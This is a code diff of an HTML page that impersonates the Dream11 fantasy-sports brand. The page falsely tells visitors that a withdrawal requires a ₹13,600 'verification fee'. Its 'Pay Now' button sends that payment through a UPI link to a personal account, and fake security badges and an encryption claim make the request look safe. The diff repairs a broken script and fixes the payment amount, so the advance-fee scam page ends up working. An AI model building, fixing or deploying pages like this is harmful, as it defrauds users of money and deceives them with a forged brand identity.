@@ -1,230 +1,230 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Processing Withdrawal - Dream11</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"/>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
-    }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Processing Withdrawal - Dream11</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"/>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
 
-    body {
-      background: linear-gradient(135deg, #0c2461, #1e3799);
-      color: #333;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
+    body {
+      background: linear-gradient(135deg, #0c2461, #1e3799);
+      color: #333;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
 
-    .container {
-      max-width: 500px;
-      width: 100%;
-      background: white;
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-    }
+    .container {
+      max-width: 500px;
+      width: 100%;
+      background: white;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+    }
 
-    .header {
-      background: linear-gradient(to right, #2c3e50, #4a6491);
-      color: white;
-      padding: 25px 20px;
-      text-align: center;
-    }
+    .header {
+      background: linear-gradient(to right, #2c3e50, #4a6491);
+      color: white;
+      padding: 25px 20px;
+      text-align: center;
+    }
 
-    .logo {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
 
-    .logo-icon {
-      font-size: 28px;
-      color: #00b894;
-    }
+    .logo-icon {
+      font-size: 28px;
+      color: #00b894;
+    }
 
-    .logo-text {
-      font-size: 28px;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    .logo-text {
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
 
-    .processing-container {
-      text-align: center;
-      padding: 40px 20px;
-    }
+    .processing-container {
+      text-align: center;
+      padding: 40px 20px;
+    }
 
-    .processing-icon {
-      font-size: 80px;
-      color: #00b894;
-      margin: 20px 0;
-      animation: pulse 2s infinite;
-    }
+    .processing-icon {
+      font-size: 80px;
+      color: #00b894;
+      margin: 20px 0;
+      animation: pulse 2s infinite;
+    }
 
-    .processing-title {
-      font-size: 28px;
-      font-weight: 700;
-      color: #2c3e50;
-      margin-bottom: 15px;
-    }
+    .processing-title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #2c3e50;
+      margin-bottom: 15px;
+    }
 
-    .processing-text {
-      font-size: 18px;
-      color: #555;
-      line-height: 1.6;
-      margin-bottom: 25px;
-    }
+    .processing-text {
+      font-size: 18px;
+      color: #555;
+      line-height: 1.6;
+      margin-bottom: 25px;
+    }
 
-    .progress-container {
-      height: 10px;
-      background: #f0f0f0;
-      border-radius: 10px;
-      overflow: hidden;
-      margin: 30px 0;
-    }
+    .progress-container {
+      height: 10px;
+      background: #f0f0f0;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 30px 0;
+    }
 
-    .progress-bar {
-      height: 100%;
-      width: 0;
-      background: linear-gradient(to right, #00b894, #009d71);
-      border-radius: 10px;
-      transition: width 0.5s ease;
-    }
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(to right, #00b894, #009d71);
+      border-radius: 10px;
+      transition: width 0.5s ease;
+    }
 
-    .highlight-box {
-      background: linear-gradient(to right, #ffefba, #ffffff);
-      border-radius: 12px;
-      padding: 15px;
-      margin: 15px 0;
-      border-left: 4px solid #00b894;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
+    .highlight-box {
+      background: linear-gradient(to right, #ffefba, #ffffff);
+      border-radius: 12px;
+      padding: 15px;
+      margin: 15px 0;
+      border-left: 4px solid #00b894;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
 
-    .highlight-box i {
-      font-size: 24px;
-      color: #00b894;
-    }
+    .highlight-box i {
+      font-size: 24px;
+      color: #00b894;
+    }
 
-    .pay-btn {
-      display: inline-block;
-      margin-top: 25px;
-      background: #00b894;
-      color: white;
-      padding: 12px 25px;
-      font-size: 18px;
-      font-weight: 600;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
+    .pay-btn {
+      display: inline-block;
+      margin-top: 25px;
+      background: #00b894;
+      color: white;
+      padding: 12px 25px;
+      font-size: 18px;
+      font-weight: 600;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
 
-    .pay-btn:hover {
-      background: #00916b;
-    }
+    .pay-btn:hover {
+      background: #00916b;
+    }
 
-    .footer {
-      text-align: center;
-      padding: 20px;
-      color: #777;
-      font-size: 14px;
-      background: #f8f9fa;
-      border-top: 1px solid #eee;
-    }
+    .footer {
+      text-align: center;
+      padding: 20px;
+      color: #777;
+      font-size: 14px;
+      background: #f8f9fa;
+      border-top: 1px solid #eee;
+    }
 
-    .security-badges {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      margin-top: 10px;
-    }
+    .security-badges {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 10px;
+    }
 
-    .security-badge {
-      font-size: 24px;
-      color: #3498db;
-    }
+    .security-badge {
+      font-size: 24px;
+      color: #3498db;
+    }
 
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.05); opacity: 0.9; }
-      100% { transform: scale(1); opacity: 1; }
-    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.05); opacity: 0.9; }
+      100% { transform: scale(1); opacity: 1; }
+    }
 
-    @media (max-width: 480px) {
-      .processing-title {
-        font-size: 24px;
-      }
-    }
-  </style>
+    @media (max-width: 480px) {
+      .processing-title {
+        font-size: 24px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <div class="logo">
-        <i class="fas fa-crown logo-icon"></i>
-        <div class="logo-text">Dream11</div>
-      </div>
-    </div>
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <i class="fas fa-crown logo-icon"></i>
+        <div class="logo-text">Dream11</div>
+      </div>
+    </div>
 
-    <div class="processing-container">
-      <div class="processing-icon">
-        <i class="fas fa-sync-alt"></i>
-      </div>
-      <h2 class="processing-title">Withdrawal Verification Required</h2>
-      <p class="processing-text">To proceed with your withdrawal of ₹1,000,00, a one-time verification fee of ₹13,600 is required.</p>
-      <p class="processing-text">Click the button below to complete the payment using UPI. This helps us verify your identity and speed up the process.</p>
+    <div class="processing-container">
+      <div class="processing-icon">
+        <i class="fas fa-sync-alt"></i>
+      </div>
+      <h2 class="processing-title">Withdrawal Verification Required</h2>
+      <p class="processing-text">To proceed with your withdrawal of ₹1,000,00, a one-time verification fee of ₹13,600 is required.</p>
+      <p class="processing-text">Click the button below to complete the payment using UPI. This helps us verify your identity and speed up the process.</p>
 
-      <div class="progress-container">
-        <div class="progress-bar" id="progressBar"></div>
-      </div>
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
 
-      <button class="pay-btn" onclick="redirectToUPI()">Pay Now</button>
+      <button class="pay-btn" onclick="redirectToUPI()">Pay Now</button>
 
-      <div class="highlight-box">
-        <i class="fas fa-shield-alt"></i>
-        <div>Your transaction is secured with bank-level encryption</div>
-      </div>
-    </div>
+      <div class="highlight-box">
+        <i class="fas fa-shield-alt"></i>
+        <div>Your transaction is secured with bank-level encryption</div>
+      </div>
+    </div>
 
-    <div class="footer">
-      <div class="security-badges">
-        <i class="fas fa-shield-alt security-badge"></i>
-        <i class="fas fa-lock security-badge"></i>
-        <i class="fas fa-fingerprint security-badge"></i>
-      </div>
-      <div style="margin-top: 10px;">© 2023 Dream Sports. All rights reserved.</div>
-    </div>
-  </div>
+    <div class="footer">
+      <div class="security-badges">
+        <i class="fas fa-shield-alt security-badge"></i>
+        <i class="fas fa-lock security-badge"></i>
+        <i class="fas fa-fingerprint security-badge"></i>
+      </div>
+      <div style="margin-top: 10px;">© 2023 Dream Sports. All rights reserved.</div>
+    </div>
+  </div>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const progressBar = document.getElementById('progressBar');
-      let width = 0;
-      const interval = setInterval(() => {
-        if (width >= 100) {
-          clearInterval(interval);
-        } else {
-          width++;
-          progressBar.style.width = width + '%';
-        }
-      }, 30);
-    });function redirectToUPI() {
-  window.location.href =
-    "upi://pay?pa=6005973034@upi&pn=Withdrawal%20Fee&tn=Withdrawal%20Verification%20Fee&am=13,600&cu=INR";
-    }
-    }
-  </script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const progressBar = document.getElementById('progressBar');
+      let width = 0;
+      const interval = setInterval(() => {
+        if (width >= 100) {
+          clearInterval(interval);
+        } else {
+          width++;
+          progressBar.style.width = width + '%';
+        }
+      }, 30);
+    });
+
+    function redirectToUPI() {
+      window.location.href =
+        "upi://pay?pa=6005973034@upi&pn=Withdrawal%20Fee&tn=Withdrawal%20Verification%20Fee&am=13600&cu=INR";
+    }
+  </script>
 </body>
 </html>
